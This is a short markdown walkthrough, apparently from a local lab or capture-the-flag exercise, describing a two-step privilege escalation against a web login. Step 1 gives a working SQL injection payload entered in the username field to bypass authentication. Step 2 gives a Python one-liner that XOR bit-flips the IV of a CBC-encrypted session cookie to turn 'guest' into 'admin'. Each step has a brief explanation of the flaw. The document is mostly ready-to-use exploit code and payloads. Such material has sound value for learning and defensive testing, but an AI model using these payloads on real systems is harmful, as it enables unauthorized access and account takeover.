# Payloads and Exploitation Workflow

This document records the specific commands and logic used to explore database authentication bypasses and token state manipulation within the local lab environment.

---

## Step 1: Bypassing Database Authentication (SQL Injection)

To inspect how the application generates session cookies for users, input the following statement into the username field of the login interface.

```text
admin' UNION SELECT 'admin', '' -- -
```

### Concept:
* **What it does:** This payload exploits input concatenation by injecting a `UNION SELECT` statement. 
* **The Goal:** It tricks the database into returning a dummy record matching the "admin" user layout. This bypasses structural password checks and forces the application to issue an initial state cookie.

---

## Step 2: Modifying Token States

Once the application issues a cookie, run the following local command inside your terminal. Replace `'Here goes the token cookie'` with the actual cookie string received from the browser.

```bash
python3 -c "
import base64
from urllib.parse import quote, unquote

# 1. Paste the raw cookie value here
original_token_b64 = 'Here goes the token cookie'

# 2. URL-decode the string first (turns %3D%3D into ==)
clean_b64 = unquote(original_token_b64)

# 3. Decode to raw Initialization Vector (IV) bytes
iv = bytearray(base64.b64decode(clean_b64))

# 4. Define target state transformation
old = b'guest'
new = b'admin'

# 5. Apply the XOR bit-flip math
for i in range(len(old)):
    iv[i] ^= old[i] ^ new[i]

# 6. Re-encode the modified IV for web transmission
admin_token = quote(base64.b64encode(iv).decode())
print('Your Admin Token:', admin_token)
"
```

### Concept:
* **What it does:** This script alters the raw bytes of the Initialization Vector (IV).
* **The Goal:** Because Cipher Block Chaining (CBC) mode decrypts the first block by XORing it with the IV, a direct modification of the IV forces a bit-for-bit change in the final decrypted text. This alters the session context from `guest` to `admin` without altering the key.

